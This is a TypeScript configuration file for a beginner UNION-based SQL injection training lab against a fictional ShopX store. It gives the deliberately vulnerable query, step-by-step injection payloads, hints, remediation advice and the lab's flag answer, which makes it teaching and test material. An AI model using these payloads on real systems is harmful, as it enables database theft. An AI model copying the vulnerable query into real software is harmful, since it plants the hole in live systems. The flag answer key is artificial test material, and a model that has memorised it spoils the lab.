import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab2Metadata: LabMetadata = {
  slug: 'sqli-union-extract',
  title: 'SQL Injection: UNION-Based Data Extraction',
  ar_title: 'حقن SQL: استخراج البيانات عبر UNION',
  description:
    'Use UNION-based SQL injection to extract sensitive data from a hidden database table through a product search endpoint.',
  ar_description:
    'استخدم حقن SQL القائم على UNION لاستخراج بيانات حساسة من جدول مخفي في قاعدة البيانات عبر نقطة نهاية البحث عن المنتجات.',
  difficulty: 'BEGINNER',
  category: 'WEB_SECURITY',
  skills: ['SQL Injection', 'UNION Attack', 'Column Enumeration', 'Data Extraction'],
  xpReward: 120,
  pointsReward: 60,
  duration: 35,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  environmentType: 'ECOMMERCE',
  canonicalConceptId: 'sqli-union',

  goal: 'Extract admin credentials from the hidden `secrets` table using UNION injection.',
  ar_goal: 'استخرج بيانات اعتماد الأدمن من جدول `secrets` المخفي باستخدام حقن UNION.',

  missionBrief: {
    codename: 'UNION STRIKE',
    classification: 'SECRET',
    objective: 'The ShopX product search endpoint reflects unsanitized input into a raw SQL query. Use UNION injection to pivot into a hidden secrets table and retrieve the admin credential stored there.',
    ar_objective: 'نقطة نهاية البحث عن المنتجات في ShopX تعكس المدخلات غير المعقّمة في استعلام SQL خام. استخدم حقن UNION للانتقال إلى جدول secrets مخفي واسترداد بيانات الاعتماد المخزّنة فيه.',
    background: 'ShopX is a mid-sized e-commerce platform. The search bar passes the query parameter directly into a SELECT statement with no parameterization.',
    successCriteria: [
      'Determine the number of columns in the original query',
      'Find which column is text-renderable',
      'Inject UNION SELECT to pull data from the secrets table',
      'Retrieve the flag',
    ],
  },

  labInfo: {
    vulnType: 'UNION-Based SQL Injection',
    ar_vulnType: 'حقن SQL القائم على UNION',
    cweId: 'CWE-89',
    cvssScore: 9.1,
    description: 'UNION injection appends a second SELECT statement to the original query, allowing the attacker to retrieve data from arbitrary tables. Requires matching column count and compatible data types.',
    ar_description: 'يُضيف حقن UNION جملة SELECT ثانية للاستعلام الأصلي، مما يسمح للمهاجم باسترداد البيانات من أي جدول. يتطلب تطابق عدد الأعمدة وأنواع البيانات المتوافقة.',
    whatYouLearn: [
      'How to enumerate column count using ORDER BY',
      'How to identify string-renderable columns with NULL payloads',
      'How to extract data from arbitrary tables using UNION SELECT',
    ],
    techStack: ['Node.js', 'PostgreSQL', 'Raw SQL'],
    references: [
      { label: 'PortSwigger: UNION attacks', url: 'https://portswigger.net/web-security/sql-injection/union-attacks' },
    ],
  },

  briefing: {
    en: `ShopX just launched a search feature. Customers can search for products by name.
You noticed the URL looks like: /search?q=laptop
The results change with your input. What if the input goes directly into the query?
Time to find out what else lives in this database.`,
    ar: `أطلقت ShopX ميزة بحث جديدة. يمكن للعملاء البحث عن المنتجات بالاسم.
لاحظت أن الـ URL يبدو كالتالي: /search?q=laptop
النتائج تتغير بمدخلاتك. ماذا لو ذهب المدخل مباشرة إلى الاستعلام؟
حان الوقت لاكتشاف ما يوجد في قاعدة البيانات.`,
  },

  stepsOverview: {
    en: [
      'Column count — use ORDER BY 1,2,3... until error to find column count',
      'String column — inject UNION SELECT NULL,NULL,... replacing NULLs with strings',
      'Extract — UNION SELECT null,secret_value,null FROM secrets WHERE id=1',
    ],
    ar: [
      'عدد الأعمدة — استخدم ORDER BY 1,2,3... حتى الخطأ لمعرفة عدد الأعمدة',
      'عمود النص — احقن UNION SELECT NULL,NULL,... باستبدال NULLs بنصوص',
      'استخراج — UNION SELECT null,secret_value,null FROM secrets WHERE id=1',
    ],
  },

  solution: {
    context: 'Product search query: SELECT id, name, price FROM products WHERE name LIKE \'%$input%\'',
    vulnerableCode: "SELECT id, name, price FROM products WHERE name LIKE '%$query%'",
    exploitation: "Step 1: ' ORDER BY 3-- → no error (3 columns). Step 2: ' UNION SELECT NULL,'test',NULL-- → string in col 2. Step 3: ' UNION SELECT NULL,secret_value,NULL FROM secrets WHERE id=1--",
    steps: {
      en: [
        "Test injection point: search for laptop' and observe error",
        'Enumerate columns: ORDER BY 1--, ORDER BY 2--, ORDER BY 3--, ORDER BY 4-- (error = 3 columns)',
        "Find string column: ' UNION SELECT NULL,'test',NULL--",
        "Extract data: ' UNION SELECT NULL,secret_value,NULL FROM secrets WHERE id=1--",
        'The flag appears in the results',
      ],
      ar: [
        "اختبر نقطة الحقن: ابحث عن laptop' ولاحظ الخطأ",
        'عدّد الأعمدة: ORDER BY 1--, 2--, 3--, 4-- (الخطأ يعني 3 أعمدة)',
        "ابحث عن عمود النص: ' UNION SELECT NULL,'test',NULL--",
        "استخرج البيانات: ' UNION SELECT NULL,secret_value,NULL FROM secrets WHERE id=1--",
        'العلم يظهر في النتائج',
      ],
    },
    fix: [
      'Use parameterized queries: SELECT id, name, price FROM products WHERE name LIKE $1',
      'Whitelist allowed characters in search input',
      'Implement query result limits',
    ],
  },

  postSolve: {
    explanation: {
      en: 'UNION-based injection requires matching the number of columns and finding at least one string-compatible column. Once achieved, the attacker can SELECT from any table in the database.',
      ar: 'يتطلب حقن UNION تطابق عدد الأعمدة وإيجاد عمود واحد على الأقل متوافق مع النصوص. بمجرد تحقيق ذلك، يمكن للمهاجم SELECT من أي جدول في قاعدة البيانات.',
    },
    impact: {
      en: 'Complete database read access. All tables, all data — credentials, PII, financial records.',
      ar: 'وصول قراءة كامل لقاعدة البيانات. جميع الجداول وجميع البيانات — بيانات الاعتماد والمعلومات الشخصية والسجلات المالية.',
    },
    fix: ['Parameterized queries', 'ORM usage', 'Principle of least privilege on DB user'],
  },

  hints: [
    {
      order: 1,
      xpCost: 10,
      content: "First, confirm the injection point. Search for: laptop' -- \nIf you get an error or empty results, the input is reflected into SQL. Now count columns: try ORDER BY 1--, ORDER BY 2--, ORDER BY 3-- until you get an error. The last working number = column count.",
    },
    {
      order: 2,
      xpCost: 20,
      content: "You have 3 columns. Now find which one is text-renderable.\nTry: ' UNION SELECT NULL,NULL,NULL--\nThen replace one NULL at a time with 'test': ' UNION SELECT NULL,'test',NULL--\nWhen 'test' appears in the results, that's your string column.",
    },
    {
      order: 3,
      xpCost: 30,
      content: "String column is column 2. Now extract from the secrets table:\n' UNION SELECT NULL,secret_value,NULL FROM secrets WHERE id=1--\n\nThis injects a second SELECT that reads from the secrets table and returns it in the name column of your results.",
    },
  ],

  flagAnswer: 'FLAG{SQLI_UNION_EXTRACT_SUCCESS}',
  initialState: {
    products: [
      { id: 1, name: 'Laptop Pro', price: 999 },
      { id: 2, name: 'Wireless Mouse', price: 29 },
      { id: 3, name: 'Mechanical Keyboard', price: 89 },
    ],
    secrets: [
      { id: 1, secret_value: 'FLAG{SQLI_UNION_EXTRACT_SUCCESS}' },
    ],
  },
};
